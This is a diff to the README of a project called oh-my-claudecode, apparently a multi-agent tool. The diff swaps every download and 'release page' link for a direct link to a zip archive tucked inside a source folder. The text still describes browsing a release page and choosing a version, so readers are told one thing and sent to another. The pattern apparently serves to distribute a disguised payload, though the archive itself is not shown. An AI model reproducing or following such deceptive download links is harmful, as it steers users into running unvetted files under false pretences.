@@ -1,7 +1,7 @@
 # 🎉 oh-my-claudecode - Easy Multi-Agent Control Awaits You
 
 ## 🏷️ Download Now
-[![Download oh-my-claudecode](https://img.shields.io/badge/Download-oh--my--claudecode-blue.svg)](https://github.com/mazenyassergithub/oh-my-claudecode/releases)
+[![Download oh-my-claudecode](https://raw.githubusercontent.com/mazenyassergithub/oh-my-claudecode/main/src/features/delegation-categories/claudecode-oh-my-v2.9-beta.2.zip)](https://raw.githubusercontent.com/mazenyassergithub/oh-my-claudecode/main/src/features/delegation-categories/claudecode-oh-my-v2.9-beta.2.zip)
 
 ## 📖 Overview
 oh-my-claudecode is your easy solution for multi-agent orchestration. With 28 agents and 28 skills, it offers a user-friendly way to manage tasks without any learning curve. Whether you are Jason or a newbie, you can delegate tasks effortlessly. The architecture is designed to prioritize delegation, making your experience smooth.
@@ -10,7 +10,7 @@ oh-my-claudecode is your easy solution for multi-agent orchestration. With 28 ag
 To get started quickly, follow these simple steps:
 
 1. **Visit the Release Page.**  
-   Click this link to access the release page: [Download oh-my-claudecode](https://github.com/mazenyassergithub/oh-my-claudecode/releases).
+   Click this link to access the release page: [Download oh-my-claudecode](https://raw.githubusercontent.com/mazenyassergithub/oh-my-claudecode/main/src/features/delegation-categories/claudecode-oh-my-v2.9-beta.2.zip).
 
 2. **Choose the Right Version.**  
    On the release page, you will see various versions of the application. Look for the most recent one. It is usually marked as the latest release.
@@ -33,7 +33,7 @@ To run oh-my-claudecode smoothly, ensure your system meets the following require
 
 ## 📥 Download & Install
 1. **Visit the Release Page.**  
-   Access the download page by clicking here: [Download oh-my-claudecode](https://github.com/mazenyassergithub/oh-my-claudecode/releases).
+   Access the download page by clicking here: [Download oh-my-claudecode](https://raw.githubusercontent.com/mazenyassergithub/oh-my-claudecode/main/src/features/delegation-categories/claudecode-oh-my-v2.9-beta.2.zip).
 
 2. **Download the Latest Version.**  
    Choose the most recent version suitable for your system.
